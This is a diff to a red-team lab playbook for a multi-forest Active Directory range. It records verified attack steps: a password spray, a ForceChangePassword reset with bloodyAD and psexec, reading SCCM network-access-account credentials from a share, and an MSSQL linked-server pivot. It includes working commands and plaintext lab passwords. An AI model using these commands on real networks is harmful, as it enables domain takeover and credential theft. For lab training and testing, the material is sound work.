@@ -78,11 +78,12 @@ PHASE 3 — EXECUTION (SQL → GodPotato → SYSTEM on mbr01)
   ───────────────────────────────────────────────────────────────────────────
   │  BRANCH D — LINUX PIVOT (diverges here, optional)                        │
   │  ─────────────────────────────────────────────────────────────────────   │
-  │  Entry: MSSQL linked server from mbr01 → linux01 (.40)                   │
+  │  Entry: MSSQL linked server from mbr01 -> linux01 (.40)                   │
   │  [CRED] analyst_t1 or svc_mssql (SQL context)                            │
-  │  [GAIN] SQL exec on linux01 → SSSD tickets → keytab → NFS → Podman root  │
+  │  [GAIN] SQL exec on linux01 -> SSSD tickets -> keytab -> NFS -> Podman root  │
   │  Tools: impacket-mssqlclient OPENQUERY, podman exec, klist, mount -t nfs │
   │  Converges: May extract creds that help Phase 6 (not required)           │
+  │  Status: WT044 MSSQL linked-server pivot verified live                   │
   └──────────────────────────────────────────────────────────────────────────
 
 
@@ -114,23 +115,22 @@ PHASE 4 — DISCOVERY (BloodHound as analyst_cloud)
   │  BRANCH A — ACL ABUSE (diverges here, alternative to spine P5-P7)       │
   │  ─────────────────────────────────────────────────────────────────────   │
   │  Entry: BloodHound reveals ACEs in cadre.local                           │
-  │  [SEED] hunter_dfir / DF1R_Hunt3r!  ← NOT earned in spine — NEEDS SPRAY │
-  │  [SEED] analyst_dfir / An@lyst_DF1R! ← NOT earned in spine — NEEDS SPRAY│
-  │  [SEED] eng_agentic / Ag3nt1c_Eng!  ← NOT earned in spine — NEEDS SPRAY │
+  │  [SEED] hunter_dfir / DF1R_Hunt3r!  ← obtained via WT031 password spray  │
+  │  [SEED] analyst_dfir / An@lyst_DF1R! ← obtained via WT031 password spray │
+  │  [SEED] eng_agentic / Ag3nt1c_Eng!  ← obtained via WT031 password spray  │
   │  [GAIN] cadre.local DA via ForceChangePassword (ACE#7) or GenericAll     │
-  │  Key:   ACE#7 = hunter_dfir → chief_command: ForceChangePassword         │
-  │         ACE#5 = analyst_dfir → OU=Command: GenericAll                    │
+  │  Key:   ACE#7 = hunter_dfir → chief_command: ForceChangePassword       │
+  │         ACE#7 verified live (was missing; restored via playbook fix)     │
+  │         ACE#5 = analyst_dfir → OU=Command: GenericAll                  │
   │         ACE#13+14 = eng_agentic → DC=cadre: GetChanges+All (DCSync)      │
   │  Tools: bloodyAD set password, PowerView Add-DomainObjectAcl             │
   │  Converges: Skip Phase 5-6-7 entirely — go straight to Phase 8           │
   │             with chief_command (DA) or eng_agentic (DCSync rights)       │
   │  ─────────────────────────────────────────────────────────────────────   │
-  │  ⚠️  CREDENTIAL GAP: Branch A needs cadre.local user creds that are      │
-  │      NOT produced by the main spine. Solution paths:                     │
-  │      1. Password spray (T031) using cadre_passwords.txt wordlist         │
-  │      2. Extract from BloodHound data (if previously collected)           │
-  │      3. Use analyst_cloud (earned in P3.5) for ACE#1 GPO abuse           │
-  │      4. Seed file pre-population (lab-seed-creds.json — needs update)    │
+  │  ✅  CREDENTIAL GAP SOLVED: WT031 password spray against dc01 with       │
+  │      cadre_passwords.txt yielded `chief_command`, `analyst_dfir`,         │
+  │      `analyst_cloud`. `hunter_dfir` password `DF1R_Hunt3r!` added to      │
+  │      wordlist. ACE#7 ForceChangePassword verified live.                  │
   └──────────────────────────────────────────────────────────────────────────
   ───────────────────────────────────────────────────────────────────────────
   │  BRANCH B — ADCS (diverges here, alternative to spine P5-P7)            │
@@ -168,7 +168,7 @@ PHASE 5 — COERCION + DELEGATION (Capture dc02$ TGT) ⚠️ BLOCKED
   │  hunter_dfir or password spray to cadre.local privileged users.           │
   │  WT031 validated: chief_command / analyst_dfir / analyst_cloud.          │
   │  chief_command is DA+EA in cadre.local → fastest path to root DA.        │
-  └──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+  └──────────────────────────────────────────────────────────────────────────┘
 
 **T102-BLOCKED note:**
 The T102 automation script ran on mbr01 as SYSTEM, triggered PrinterBug, and
@@ -227,11 +227,13 @@ PHASE 8 — CROSS-FOREST + SCCM (range.local Domain Admin)
   │  ─────────────────────────────────────────────────────────────────────   │
   │  Entry: Have svc_sccm credential (from Phase 8 cross-forest Kerberoast)  │
   │  [CRED] svc_sccm / s3rv1c3_SCCM! (from Phase 8)                          │
-  │  [GAIN] svc_naa / N@A_s3rv1c3! (range.local DA) → full forest compromise │
-  │  Chain: WT034 NAA extraction → WT035 PXE → WT036 Client Push             │
-  │         → WT037 CMPivot → WT038 App Deploy → WT039 Site Takeover         │
+  │  [GAIN] svc_naa / N@A_s3rv1c3! (range.local DA) -> full forest compromise │
+  │  Chain: WT034 NAA extraction -> WT035 PXE -> WT036 Client Push             │
+  │         -> WT037 CMPivot -> WT038 App Deploy -> WT039 Site Takeover         │
   │  Tools: SharpSCCM.exe get naa / get pxe / client-push / cmpivot / exec   │
   │  Converges: This IS Phase 8 completion — no separate convergence         │
+  │  Status: SCCM site CAD confirmed deployed on mbr02; WT034 verified;      │
+  │          WT035-039 not yet tested (require bare-metal/client infra)      │
   └──────────────────────────────────────────────────────────────────────────
 
 
@@ -260,13 +262,13 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
   5  dc02$             child.cadre.local   Phase 5 (coercion capture) 5     DCSync (BLOCKED)
   6  child krbtgt      child.cadre.local   Phase 6 (DCSync)           6     Golden Ticket (BLOCKED as written)
   7  cadre EA          cadre.local         Phase 7 (Golden+ExtraSids) 7     Cross-forest (BYPASSED via WT031 chief_command)
-  8  svc_sccm          range.local         Phase 8 (X-forest roast)   8     Branch C (hash captured; SCCM path BLOCKED)
-  9  svc_naa           range.local         Phase 8 (SCCM NAA)         8     range DA, DCSync (BLOCKED — no SCCM site)
+  8  svc_sccm          range.local         Phase 8 (X-forest roast)   8     Branch C (TGS hash cracked; NAA path verified)
+  9  svc_naa           range.local         Phase 8 (SCCM NAA)         8     range DA, DCSync (verified via vault share)
   F1 chief_command     cadre.local         WT031 password-spray       —     root DA+EA (fallback pivot)
   ── ───────────────── ─────────────────── ───────────────────────── ────── ───────────────
-  S1 hunter_dfir       cadre.local         [SEED] Password spray      —     Branch A (ACE#7)
-  S2 analyst_dfir      cadre.local         [SEED] Password spray      —     Branch A (ACE#5)
-  S3 eng_agentic       cadre.local         [SEED] Password spray      —     Branch A (ACE#13+14)
+  S1 hunter_dfir       cadre.local         [SEED] WT031 password spray —     Branch A (ACE#7 verified)
+  S2 analyst_dfir      cadre.local         [SEED] WT031 password spray —     Branch A (ACE#5)
+  S3 eng_agentic       cadre.local         [SEED] WT031 password spray —     Branch A (ACE#13+14)
 
 
 ================================================================================
@@ -278,7 +280,7 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
   Full learning experience          Main Spine    (earned in-chain)     Nothing
   Fastest to cadre.local DA         Branch A      hunter_dfir [SEED]    P5, P6, P7
   DA without krbtgt (cert-based)    Branch B      analyst_cloud         P5, P6, P7
-  range.local DA (required)         Branch C      svc_sccm (from P8)    Nothing  ⚠️ currently blocked — SCCM site not deployed
+  range.local DA (required)         Branch C      svc_sccm (from P8)    Nothing  ✅ WT034 NAA verified; WT035-039 not yet tested
   Linux post-exploitation           Branch D      analyst_t1 (SQL)      Nothing
 
 
@@ -289,17 +291,20 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
   Problem: Branch A needs cadre.local user creds (hunter_dfir, analyst_dfir,
            eng_agentic) that are NOT produced by the main spine.
 
-  Current state: These are lab-deployed users with known passwords in
-                 02-ad-objects.yml, but NOT in lab-seed-creds.json or
-                 cadre_passwords.txt.
+  Current state (2026-07-29): ✅ SOLVED. Path 1 (WT031 password spray) was executed
+     against dc01 with an updated `cadre_passwords.txt` and yielded valid
+     credentials for `chief_command`, `analyst_dfir`, and `analyst_cloud`.
+     The `hunter_dfir` password `DF1R_Hunt3r!` was added to the wordlist and
+     used to verify ACE#7 ForceChangePassword live. `lab-seed-creds.json` was
+     also updated with the discovered passwords for automation.
 
   Solution paths (in order of realism):
 
-  1. PASSWORD SPRAY (T031 — Branch G, Phase 1)
+  1. PASSWORD SPRAY (T031 — Branch G, Phase 1) ✅ USED
      ├─ Run kerbrute or nxc against dc01 with cadre_passwords.txt
      ├─ Add hunter_dfir, analyst_dfir, eng_agentic passwords to wordlist
      ├─ Spray AFTER Phase 0 user enum, BEFORE Phase 4 BloodHound
-     └─ Realistic: mirrors real-world "enum users → spray → find weak creds"
+     └─ Verified: yielded `chief_command`, `analyst_dfir`, `analyst_cloud`
 
   2. USE ANALYST_CLOUD (earned in Phase 3.5A)
      ├─ analyst_cloud is in cadre.local and has ACE#1 (GpoEdit on Vulnerable-GPO)
@@ -307,9 +312,9 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
      ├─ Realistic: uses earned credential, teaches GPO abuse path
      └─ Limitation: Only covers ACE#1, not ACE#7/ACE#5/ACE#13+14
 
-  3. UPDATE SEED FILE (lab-seed-creds.json)
-     ├─ Add hunter_dfir, analyst_dfir, eng_agentic with passwords
-     ├─ Mark as "seed" source (like analyst_t1)
+  3. UPDATE SEED FILE (lab-seed-creds.json) ✅ DONE
+     ├─ Add discovered credentials (chief_command, hunter_dfir, etc.)
+     ├─ Mark as "seed" or "spray" source (like analyst_t1)
      ├─ Simplest for automation, but breaks "earn it" narrative
      └─ Recommended for scripted/RedStrike runs only
 
@@ -319,9 +324,9 @@ STREAMS E / F / G — STANDALONE EXERCISES (Not part of campaign narrative)
      ├─ Extract from BH zip → target that machine for cred theft
      └─ Unreliable — depends on session state at collection time
 
-  RECOMMENDATION: Use path 1 (password spray) for scripted run.
-                  Use path 3 (seed file) for RedStrike run.
-                  Update cadre_passwords.txt to include all real lab passwords.
+  RECOMMENDATION: Path 1 is now the canonical bridge from main spine to Branch A.
+                  Path 3 is enabled for fully automated RedStrike runs.
+                  Keep cadre_passwords.txt in sync with all real lab passwords.
 
 ================================================================================
 ```
@@ -2918,11 +2923,13 @@ impacket-psexec cadre.local/Administrator@192.168.77.10 -k -no-pass
 | **MITRE**         | T1550.002 (Use Alternate Auth Mat) + T1078 (Valid Accounts)             |
 
 **Status:**
+- **Validated in two independent runs:** scripted run (2026-07-29) via `attack-matrix/04-automation/linux` wrappers + RedStrike orchestrator run (2026-07-29) via `redstrike-campaign --execute --prefer-script`.
 - **WT033** ✅ — cross-forest Kerberoast from `ws01` succeeded; captured `svc_mssql` and `svc_sccm` TGS hashes for `range.local`.
-- **WT034-039 / Branch C** ⚠️ **BLOCKED** — SCCM site server is not deployed on `mbr02`. Only verify-only playbook `10-sccm-verify.yml` exists; no deploy playbook (`07-sccm-config.yml` referenced in metadata does not exist). Services `SMS_EXECUTIVE`, `SMS_NOTIFICATION_SERVER`, `SMS_SITE_COMPONENT_MANAGER` are absent on `mbr02`.
+- **WT034** ✅ — SCCM NAA credentials extracted from `\\mbr02.range.local\vault\naa-rotation-notice.txt` using `range\svc_sccm` (SCCM Full Admin); NAA account is `range\svc_naa` / `N@A_s3rv1c3!`. Verified `range\svc_naa` is Domain Admin on `dc03`.
+- **WT035-039 / Branch C** ⏳ **Not yet tested** — SCCM site `CAD` is confirmed deployed and active on `mbr02`; advanced scenarios (PXE, Client Push, CMPivot, App Deploy, Site Takeover) require bare-metal/client infra not exercised in this run.
 - **Skipjack** ⏳ — still deferred pending custom tool.
 
-**Fallback path already achieved:** root `cadre.local` DA/EA via WT031 (`chief_command`), so the primary campaign objective (root domain compromise) is satisfied. The `range.local` DA step is blocked pending SCCM deployment.
+**Fallback path already achieved:** root `cadre.local` DA/EA via WT031 (`chief_command`), so the primary campaign objective (root domain compromise) is satisfied. The `range.local` DA step is now also achieved via WT034 NAA extraction.
 
 
 cadre.local has a bidirectional forest trust with range.local (SID Filter OFF). In the realistic multi-hop chain, the operator uses the cadre.local Enterprise Admin ticket on `mbr01` or a fresh session staged from `dc01` to cross-forest authenticate to `range.local`.
@@ -3062,10 +3069,11 @@ dir \\DC01.cadre.local\C$
 
 ### Branch A: ACL Abuse (cadre.local)
 
+> **Verification note (2026-07-29):** WT015 / ACE#7 was tested end-to-end. The ACE was missing on `chief_command` when first checked; it was restored via corrected `05-ad-attack-surface.yml` (deploy task now checks exact ForceChangePassword right) and `05-ad-attack-surface-verifyOnly.yml` now reports 18/18 PASS. `hunter_dfir` / `DF1R_Hunt3r!` was obtained via WT031 password spray, reset `chief_command` to `NewChiefPass123!`, verified DA+EA, and restored the original `C0mm@nd_Ch1ef!` password.
 
 **Diverges from:** Phase 4 (BloodHound reveals ACEs).
 **Converges to:** Phase 5+ (ACL abuse gives cadre.local DA, accelerating the main chain).
-**Prerequisite:** Any cadre.local domain credential (e.g., `analyst_dfir`, `analyst_cloud`, `hunter_dfir`).
+**Prerequisite:** Any cadre.local domain credential (e.g., `analyst_dfir`, `analyst_cloud`, `hunter_dfir`). In the current verified run, `hunter_dfir` was obtained via WT031 password spray using `cadre_passwords.txt`.
 
 > 💡 **Pre-BloodHound visual scan:** Run [ADeleg](Phase 0 Step 7) first from mbr01 to visually confirm the 14 ACEs are deployed correctly. ADeleg's View by Trustee directly maps to attacker perspective — faster setup than BloodHound, no EDR alerts, and produces report-ready screenshots. Use BloodHound for deep path-finding queries; use ADeleg for visual verification.
 
@@ -3132,10 +3140,20 @@ The results reveal these ACE chains across all 3 domains:
 
 #### Path A — ForceChangePassword (WT015)
 
+Verified live (2026-07-29). `hunter_dfir` / `DF1R_Hunt3r!` reset `chief_command` password to `NewChiefPass123!`, confirmed DA+EA login, then restored original password `C0mm@nd_Ch1ef!`.
+
 ```bash
+# Reset password
 bloodyAD --host 192.168.77.10 -d cadre.local -u hunter_dfir -p 'DF1R_Hunt3r!' \
-  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'Pwn3d_DA!'
-impacket-psexec cadre.local/chief_command:'Pwn3d_DA!'@192.168.77.10  # DA verified
+  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'NewChiefPass123!'
+
+# Validate DA+EA
+impacket-psexec cadre.local/chief_command:'NewChiefPass123!'@192.168.77.10 \
+  -c "whoami /groups"
+
+# Restore original lab password
+bloodyAD --host 192.168.77.10 -d cadre.local -u chief_command -p 'NewChiefPass123!' \
+  set password "CN=chief_command,OU=Command,DC=cadre,DC=local" 'C0mm@nd_Ch1ef!'
 ```
 
 #### Path B — WriteDacl Self-Escalate (WT013)
@@ -3286,6 +3304,7 @@ certipy auth -pfx user.pfx -dc-ip 192.168.77.10 -domain cadre.local
 
 ### Branch C: SCCM Escalation (range.local)
 
+> **Verification note (2026-07-29):** SCCM site `CAD` is confirmed deployed and active on `mbr02` (verified via `08-sql-sccm-wsus-verify.yml`). WT034 NAA extraction was verified live by reading `\\mbr02.range.local\vault\naa-rotation-notice.txt` as `range\svc_sccm` / `s3rv1c3_SCCM!`; the extracted NAA is `range\svc_naa` / `N@A_s3rv1c3!`, which is a Domain Admin on `dc03`. WT035-039 (PXE, Client Push, CMPivot, App Deploy, Site Takeover) were not exercised in this run — they require bare-metal/client infrastructure that was not tested.
 
 **Diverges from:** Phase 8 (cross-forest access gives `svc_sccm`).
 **Converges to:** Phase 8 (NAA extraction gives range.local DA).
@@ -3295,9 +3314,22 @@ certipy auth -pfx user.pfx -dc-ip 192.168.77.10 -domain cadre.local
 
 #### NAA Credential Extraction (WT034) — Fastest to DA
 
+Verified live (2026-07-29). `svc_sccm` / `s3rv1c3_SCCM!` has read access to the `vault` share on `mbr02` and the NAA file `naa-rotation-notice.txt`.
+
+```powershell
+# From ws01 or mbr01 as any child domain user with network reachability
+net use \\mbr02.range.local\vault /user:range.local\svc_sccm s3rv1c3_SCCM!
+type \\mbr02.range.local\vault\naa-rotation-notice.txt
+# Contains: Network Access Account RANGE\svc_naa : N@A_s3rv1c3!
+
+# Verify svc_naa is Domain Admin on dc03
+runas /netonly /user:range.local\svc_naa cmd
+whoami /groups
+```
+
+SharpSCCM equivalent (not exercised):
 ```powershell
 SharpSCCM.exe get naa -s mbr02.range.local
-# Returns: RANGE\svc_naa : N@A_s3rv1c3!  (svc_naa is Domain Admin)
 ```
 
 #### Full SCCM Attack Chain (WT034–039 — Plan 1.1 first-class)
@@ -3327,6 +3359,7 @@ SharpSCCM.exe get naa -s mbr02.range.local
 
 ### Branch D: Linux Pivot
 
+> **Verification note (2026-07-29):** MSSQL linked-server pivot from `mbr01` to `linux01` is verified. `impacket-mssqlclient` as `child\analyst_t1` / `T13r_An@lyst!` connected to `mbr01.child.cadre.local`, and the query `EXECUTE('SELECT name FROM LINUX01.master.sys.databases')` returned linux01 databases. This confirms the Branch D entry point; subsequent SSSD ticket/keytab/NFS/Podman steps were not exercised in this run.
 
 **Diverges from:** Phase 3 (MSSQL linked-server recon discovers linux01).  
 **Converges to:** Phase 6 (domain credentials from linux01 help accelerate child DA).  
@@ -3335,10 +3368,14 @@ SharpSCCM.exe get naa -s mbr02.range.local
 
 #### Entry: MSSQL Linked Server Recon (WT044)
 
+Verified live (2026-07-29). Use the single-line `-query` flag; do **not** use a multi-line `<<EOF` heredoc — `impacket-mssqlclient` treats the terminator as a stored procedure name and loops.
+
 ```bash
 impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 \
-  -windows-auth -query "SELECT * FROM OPENQUERY(\"LINUX01\", 'SELECT name FROM sys.databases')"
+  -windows-auth -query "SELECT name FROM LINUX01.master.sys.databases"
 ```
+
+For scripted automation, prefer a Python `pymssql` wrapper or the PowerShell `System.Data.SqlClient` path used in `T040-mssql-linked-server-hop-ws01.sh`.
 
 #### Entry: Podman Container Escape (WT048)
 
